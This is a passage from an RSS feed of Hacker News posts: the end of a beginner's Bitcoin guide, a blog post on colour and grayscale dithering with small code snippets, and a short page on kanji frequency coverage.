chain-of-blocks</h4></figcaption></figure><p>Given that Bitcoin exists and operates within the confounds of the Internet, all user balances are kept on an immutable and fully transparent blockchain. Put simply, each Bitcoin transaction is broadcasted to the Bitcoin network and grouped with several other transactions in the form of a block, which the network’s miners validate. Once the block is accepted, the transactions get recorded on the blockchain (which, as you may recall, is a public ledger). Whenever this process is successfully completed, the network distributes new Bitcoin to miners for each block that has been validated ― this is referred to as a block reward.</p><p>The peculiarity of the blockchain is its distribution and decentralized properties, as all the nodes share a valid copy of the public ledger. In the Bitcoin network, nodes play a very important role ― think of them as “protectors” who are constantly monitoring Bitcoin’s blockchain to distinguish legitimate Bitcoin transactions from illegitimate ones. The basic job of a node is to prevent attempts to double-spend Bitcoins that have already been spent elsewhere. In addition, the process of mining is essential to validating transactions, as it ensures the overall trustworthiness and security of the payment network.</p><h2 id="advantages-and-limitations">Advantages and Limitations</h2><p>Members of the cryptocurrency community, who range from the tech savvy to your average retail investor, have adopted various perspectives regarding the fundamental driver of Bitcoin’s value (both in financial and non-financial terms).</p><p>On one side, there are the Bitcoin Maximalists who believe that Bitcoin is the ultimate financial innovation and will assume a mainstream role in global society ― to maximalists, other cryptocurrencies and traditional financial instruments are inferior. On the other side, you have cryptocurrency enthusiasts who believe Bitcoin’s technology is outdated and that other cryptocurrencies, such as Ethereum, have more expansive utility.</p><p>These arguments and differences of opinion (as it relates to Bitcoin) can often become confusing, so let’s dig deeper into some of the most common discussion points with hopes that you can decipher for yourself.</p><h3 id="advantages">Advantages</h3><ul><li>A blockchain is managed autonomously using <strong>a peer-to-peer network</strong> and cannot be shut down ― the only way to stop it is through shutting down or banning Internet access. (Note: Even though a blockchain or Bitcoin cannot be shut down, some jurisdictions have imposed restrictions on citizens that limit or ban the holding or trading of Bitcoin and/or other cryptocurrencies.)</li><li>There is no need to trust a third party. <strong>You are your own bank!</strong></li><li>Relatively quick and cheap transactions without intermediary fees (around 10 minutes on average per transaction), when compared to most leading cryptocurrencies.</li><li>Increasing adoption by merchants and individuals across the globe.</li><li>Largest market capitalization and name recognition, which will continue to promote its growth and (hopefully) price stability.</li></ul><h3 id="limitations">Limitations</h3><ul><li><strong>Lack of anonymity</strong> as transactions that take place in the Bitcoin network, along with many other leading cryptocurrencies, are fully transparent and can potentially be linked via chain analysis. In addition, strict AML/KYC regulations require many of the leading cryptocurrency trading exchanges to verify your most sensitive personal information.</li><li>Slow and expensive transactions, when compared to lesser known cryptocurrencies that can be sent within seconds and at a fraction of the cost.</li><li>Irreversible transactions. Once a transaction is sent, you cannot undo or cancel the transaction.</li><li>Achievement of its status as a currency will be challenging due to its volatile nature (i.e. swings in price) and regulations.</li><li>The core technology has some subtle limits that make Bitcoin outdated in comparison with other cryptocurrencies.</li></ul><p>Along with Bitcoin Maximalists and cryptocurrency enthusiasts, you have many individuals who simply like to be long-term holders of Bitcoin (because they believe in the fundamentals and value proposition) and others who speculate on the short-term price (e.g. day traders).</p><p>Whatever side you are on, there is no question that Bitcoin has established itself as a serious contender in the financial world and is here to stay for the time being. There may be other alternatives, but the granddaddy of cryptocurrencies still has the spotlight!</p><h2 id="how-to-obtain-bitcoin-from-an-exchange">How to Obtain Bitcoin from an Exchange</h2><p>Now that you have an understanding of Bitcoin and its utility, you may be interested in purchasing some. If that is the case, you have come to the right place as buying it is now easier than ever due to the growing number of exchanges and companies making Bitcoin accessible to the masses.</p><p>Some of the most well-known exchanges that allow you to purchase Bitcoin and other cryptocurrencies are <a href="https://coinbase.com/">Coinbase</a>, <a href="https://www.gemini.com/">Gemini</a>, <a href="https://www.kraken.com/">Kraken</a>, <a href="https://binance.com/">Binance</a>, and <a href="https://www.huobi.com/en-us/">Huobi</a>. While all of these exchanges list Bitcoin, not all of them offer the same cryptocurrencies ― so, it is recommended to open accounts across a few exchanges to ensure that you are provided adequate exposure.</p><p>Once you have created an account on an exchange, you can transfer your local fiat money via ACH or bank wire to the exchange. From there, you can purchase Bitcoin or another cryptocurrency in exchange for your local fiat money. In addition, after purchasing Bitcoin, you can exchange it for another cryptocurrency that you might not be able to purchase with your local fiat money. While some exchanges offer credit card purchases of Bitcoin, please keep in mind that the fees associated with this transaction are typically very high.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_2_exchange-80.jpg"><figcaption><h4>You can exchange central currencies (EUR, USD) to BTC, but sacrificing privacy.</h4></figcaption></figure><p>Using any of the exchanges listed above is the easiest and most convenient way to purchase Bitcoin, as the majority of the other cryptocurrency exchanges do not support fiat currencies. This being the case, you can only exchange other cryptocurrencies (like Ethereum or Monero) for Bitcoin. <a href="https://cash.app/">Cash App</a> and <a href="https://www.paypal.com/us/webapps/mpp/crypto">PayPal</a>, some of the largest financial technology companies, offer its users the ability to purchase Bitcoin. While this is extremely convenient for users of these platforms, the downside for PayPal (not Cash App) is that your Bitcoin must remain on its platform, so you cannot transfer or send it. Remember: Not your keys, not your coins.</p><p>If you are not keen on using any of the methods described above, Bitcoin ATMs are a great alternative. There are over 14,000 physical ATMs worldwide, most of which can be found in major cities at peculiar locations such as a shopping mall, burger restaurant, or a bar. All you need to do is deposit cash and enter your Bitcoin address. Once you have completed the transaction, the funds will be sent to you. This is a very simple process and typically does not require any identity verification, but beware of high fees!</p><h2 id="who-accepts-bitcoin">Who Accepts Bitcoin?</h2><p>Over the years, many individuals and businesses have begun accepting Bitcoin as a form of payment. From time to time, you might have noticed stickers on a shop’s window that says “Bitcoin accepted here.” As mentioned above, after the bull run of late 2017 died down, overall interest in cryptocurrencies (especially Bitcoin) amongst merchants began to wane. Today, Bitcoin and the broader digital asset space has bounced back from a pricing perspective and, with this, so has the interest amongst merchants who have triggered another wave of increased acceptance, most notably <a href="https://apnews.com/article/financial-markets-elon-musk-bitcoin-061817c6795e75d1c3c9e9d6cfc4a911">Tesla</a> disclosing that it has invested approximately $1.5 billion into Bitcoin and that the company plans to accept Bitcoin as payment for its electric vehicles.</p><p>There have been a few prominent …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/getting-started-with-bitcoin/">https://serhack.me/articles/getting-started-with-bitcoin/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/getting-started-with-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122394</guid>
            <pubDate>Sat, 13 Feb 2021 09:02:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ditherpunk 2 – beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 181 | Comments 56 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a rel="me" href="https://sunbeam.city/@makeworld"></a>
    <header>
        <h3><span>www.makeworld.gq</span></h3>
        <nav>
<a href="https://www.makeworld.gq/">Home</a>
<a href="https://www.makeworld.gq/about/">About</a>
<a href="https://www.makeworld.gq/blog/">Blog</a>

        </nav>
    </header>
    
    
    
    
    <p>Feb 12th, 2021<br>
by <strong>makeworld</strong></p>

<p><em>Last updated: Feb. 13, 2021</em></p>

<hr>

<p><em>This post contains some images that need to be viewed at 100% size to be seen correctly. If you normally browse
at a higher zoom level than 100%, please zoom out when you get to any of the images.</em></p>

<hr>

<p>Just yesterday, I released my <a href="https://github.com/makeworld-the-better-one/dither">dithering library</a>, written in Go.
It’s the product of many hours of research, experimentation, and refactoring. I’m
excited that it’s finally out, and to see what people create with it. Personally I’d like to create a CLI dithering
tool at some point that uses it.</p>

<p>Creating this library required research into the different algorithms for dithering, and how to implement them.
Unfortunately, not all of that knowledge is easily found. It’s spread across blog posts, Wikipedia pages without
citations, old books, and code comments. Recently, Surma wrote an article called
<a href="https://surma.dev/things/ditherpunk/">Ditherpunk — The article I wish I had about monochrome image dithering</a>.
It is an invaluable resource that combines lots of knowledge about dithering into one place. The main thing missing
from the post, however, is going beyond “monochrome”. Surma shows us how to dither with a 1-bit palette of black and
white, but what about more shades of gray? What about colour images? With this blog post I’d like to explore those
techniques, taking them out of my code and into English, so you can easily apply them elsewhere.</p>

<p><strong>First off, please read Surma’s post.</strong> It explains what dithering is, how it works, and many different algorithms.
I don’t feel the need to explain these again, but merely add on what I’ve learned.</p>

<h2 id="before-we-start">Before we start</h2>

<p>An HN commenter <a href="https://news.ycombinator.com/item?id=26122642">informed me</a> that you cannot accurately represent
linear RGB with just 8-bits (0-255), you need at least 12. Because of this, I have updated the blog post to use
16-bit color (0-65535), and will be updating the library shortly. Make sure you do this in your code too!</p>

<h2 id="overview">Overview</h2>

<p>Dithering operations consist of at least two steps, applied to each pixel. Sometimes there are further steps, like
“modify these nearby pixels”, but these are the basic ones.</p>

<ol>
  <li>Modify the pixel’s colour value.</li>
  <li>Find the colour in the palette that is “closest” to that modified value and use that on the output image.</li>
</ol>

<p>Now, we know from Surma’s post that step 1 must be done with linear RGB values. Otherwise, different values will be
affected differently – for example adding 5 to each colour won’t affect all colours the same way.</p>

<p>But what about step 2? How do we find the closest colour in the palette? In 1-bit dithering we don’t have to worry
about this, because anything above 0.5 is white, and anything below is black. But when your palette colours can be
anyhere in a 3D space, it is something that needs to be figured out.</p>

<p>Perhaps surprisingly, we’re not looking for a way that matches human perception. In fact, we are using Euclidean
distance with linear RGB values, which doesn’t match human perception at all! Why is this?
Thomas Mansencal (<a href="https://github.com/KelSolaar">@KelSolaar</a>) explains it best:</p>

<blockquote>
  <p>You can factor out the observer [the human] because what you are interested in here is basically energy
conservation. The idea being that for a given pool of radiant power emitters, if you remove a certain number of
them, by how much must the radiant power of the remaining ones be increased to be the same as that of the full
pool. It is really a ratio and doing those operations in a linear space is totally appropriate!</p>
</blockquote>

<p>This helped it click for me. Dithering can be thought of as trying to reconstruct the “radiant power” of the original
pixel colours, while restricted to a certain set of “emitters”, aka the palette colours. It is only with linearized
RGB values that we can properly measure the radiant power.</p>

<h2 id="random-noise-grayscale">Random Noise (grayscale)</h2>

<p>Random noise is a good one to start with, to show the differences between 1-bit dithering and larger palettes.</p>

<p>Surma does this by basically just adding a random number from -0.5 to 0.5, and then thresholding it.</p>

<div><div><pre><code><span>grayscaleImage</span><span>.</span><span>mapSelf</span><span>(</span><span>brightness</span> <span>=&gt;</span>
  <span>brightness</span> <span>+</span> <span>(</span><span>Math</span><span>.</span><span>random</span><span>()</span> <span>-</span> <span>0.5</span><span>)</span> <span>&gt;</span> <span>0.5</span> 
    <span>?</span> <span>1.0</span> 
    <span>:</span> <span>0.0</span>
<span>);</span>
</code></pre></div></div>

<p>In my library, there are two separate random noise functions. One is for grayscale, and one is for RGB. The grayscale
one looks like this:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>max</span><span>-</span><span>min</span><span>)</span><span>+</span><span>min</span><span>))</span>
</code></pre></div></div>

<p>The math with <code>min</code> and <code>max</code> is just to put the random value in the desired range. If we clean that up it’s more
understandable:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>rand</span><span>())</span>
</code></pre></div></div>

<p><code>rand()</code> just represents a function that does whatever range we want, -0.5 to 0.5 in this case.</p>

<p>So, obviously this is quite similar to what Surma does. The heavy lifing of the dithering in this case is done by the
other code, the part that finds the best palette colour.</p>

<p>The main thing that’s worth noting here is how the rounding works. <code>roundClamp</code> rounds the value to an integer, and then
clamps it to the range 0-65535. But how is the rounding done?</p>

<p>Another <a href="https://news.ycombinator.com/item?id=26122642">HN commenter</a> shared <a href="http://www.cplusplus.com/articles/1UCRko23/">this link</a>
which discusses different rounding methods, and the problems with the way rounding is often done. The best solution is to
use a rounding function that does this:</p>

<blockquote>
  <p>Given a number exactly halfway between two values, round to the even value (zero is considered even here).</p>

  <p>round( 1.7 ) –&gt; 2 round( 2.7 ) –&gt; 3<br>
round( 1.5 ) –&gt; 2 round( 2.5 ) –&gt; 2<br>
round( 1.3 ) –&gt; 1 round( 2.3 ) –&gt; 2</p>
</blockquote>

<p>This is not really about dithering, but this is a pretty important point to get things right mathematically.
Make sure you do it! Otherwise your outputs will be biased.</p>

<h2 id="random-noise-rgb">Random Noise (RGB)</h2>

<p>Back to random noise, but for colour this time.</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxR</span><span>-</span><span>minR</span><span>)</span><span>+</span><span>minR</span><span>))</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxG</span><span>-</span><span>minG</span><span>)</span><span>+</span><span>minG</span><span>))</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxB</span><span>-</span><span>minB</span><span>)</span><span>+</span><span>minB</span><span>))</span>
</code></pre></div></div>

<p>And simplified:</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randR</span><span>())</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randG</span><span>())</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randB</span><span>())</span>
</code></pre></div></div>

<p>Pretty simple, it just adds randomness in each channel. This can be done with grayscale images too, but it won’t
work very well, because grayscale colours only actually have one dimension. So it will just not add as much
randomness as you would expect.</p>

<p>Also note that usually you’ll want the random ranges to be the same for R, G, and B.</p>

<p>Here’s an example:</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/random_noise_rgb_red-green-black.png">
<figcaption>
Random Noise (palette is red, green, black)
</figcaption>
</figure>

</section>

<h2 id="ordered-dithering">Ordered Dithering</h2>

<h3 id="modifying-threshold-matrices">Modifying threshold matrices</h3>

<p>Most of the resources online that talk about ordered dithering talk about a “threshold matrix”. “Thresholding” is
how these matrices are applied for 1-bit dithering. You divide the matrix by whatever number is specified, scale
it to the colour value range, and compare it to each pixel in the image. If it’s less than the matrix value, make
it black, otherwise white. Obviously this doesn’t work with any other kind of palette. So what’s the solution?</p>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Wikipedia</a> offers an answer. Unfortunately there’s no citation,
but I’ve confirmed independently that it works. Here it is with some of my own math added as well.</p>

<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>65535</mn><mo>×</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo><mo>×</mo><mrow><mo fence="true">(</mo><mfrac><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>+</mo><mn>1</mn></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></mfrac><mo>−</mo><mn>0.5</mn><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">(65535 \times strength) \times \left( \frac{cell + 1}{max} - 0.5 \right)</annotation></semantics></math></span></span></span>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">cell</annotation></semantics></math></span></span> is a single cell of the matrix.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> is a percentage, usually a float from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>. It’s the amount the matrix will be applied to the
image. The closer to zero it is, the smaller the range of input colors that will be dithered. Colors outside
that range will be quantized. Usually you’ll want a strength of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>, to apply the matrix and dither fully, but
sometimes reducing it can be useful, to reduce noise in the output image. It is inversely proportional to contrast –
that is, when you reduce the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span>, it is visually similar to increasing the contrast.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> can also be negative, from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">-1.0</annotation></semantics></math></span></span>. This is useful in certain cases where the matrix usually
makes things bright, like what Surma describes with Bayer matrices.</p>

<p>Note that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65535</mn></mrow><annotation encoding="application/x-tex">65535</annotation></semantics></math></span></span> is multiplied by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> because the colours in my code are in the range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 65535]</annotation></semantics></math></span></span>. If yours
are different you can change that number.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">max</annotation></semantics></math></span></span> is the value the entire matrix is divided by. It represents the maximum value of the matrix, and normalizes
it by dividing. Usually this is the product of the dimensions of the matrix. It can also be the
largest value in the matrix plus one.</p>

<p>The result of applying this operation to each cell of the matrix is a new, precalculated matrix, which can be added
to a pixel’s colour value for dithering. Adding 0.5 does not need to happen in this case. In my library, I call the
function that does this <code>convThresholdToAddition</code>, because that’s essentially the purpose of this – converting
a threshold matrix into one that can be used for addition.</p>

<p><strong>Note:</strong> This is designed for matrices that range from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">max - 1</annotation></semantics></math></span></span>. If you’re using a matrix you found that
starts at <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span>, you’ll usually just want to subtract one from each value when you program it, then apply the operation
I described above.</p>

<h3 id="using-a-modified-matrix">Using a modified matrix</h3>

<p>Now that you’ve modified the matrix so it can be used for addition, it needs to be applied to the image. This is pretty
simple. Use modulus so the matrix values are tiled across the image, and add the same value in the R, G, and B channels.
If you’re using a grayscale image you can just apply it in the one channel, or still use RGB. Since the same value is
being added it doesn’t make much of a difference. Like always, make sure to clamp the values to the proper colour range.</p>

<p>Doing all of this definitely works with colour images, but it’s not the greatest. Here’s an example, where the palette
is red, green, and black.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>Here it is where the palette is red, green, black, and yellow.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-yellow-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-yellow-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>As you can see, it doesn’t really emulate any of the yellow in the first example, while Floyd-Steinberg can. Once yellow is added
to the palette it looks pretty good though.</p>

<h2 id="error-diffusion-dithering">Error diffusion dithering</h2>

<p>Error…</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.makeworld.gq/2021/02/dithering.html">https://www.makeworld.gq/2021/02/dithering.html</a></em></p>]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
    </channel>
</rss>
